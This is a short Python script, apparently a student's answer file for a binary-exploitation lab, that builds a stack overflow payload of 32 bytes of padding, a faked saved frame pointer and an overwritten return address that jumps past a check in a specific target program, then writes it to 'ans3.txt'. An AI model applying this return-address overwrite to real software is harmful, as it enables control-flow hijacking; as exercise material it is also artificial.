import struct

padding = b"A" * 32

# rbp选一个安全的地址 0x403800
fake_rbp_addr = 0x403800
fake_rbp = struct.pack("<Q", fake_rbp_addr)

# 跳过检查
func1_bypass_check = 0x40122B
ret_addr = struct.pack("<Q", func1_bypass_check)

# 32字节padding+ 伪造rbp+ 8字节返回地址
payload = padding + fake_rbp + ret_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)
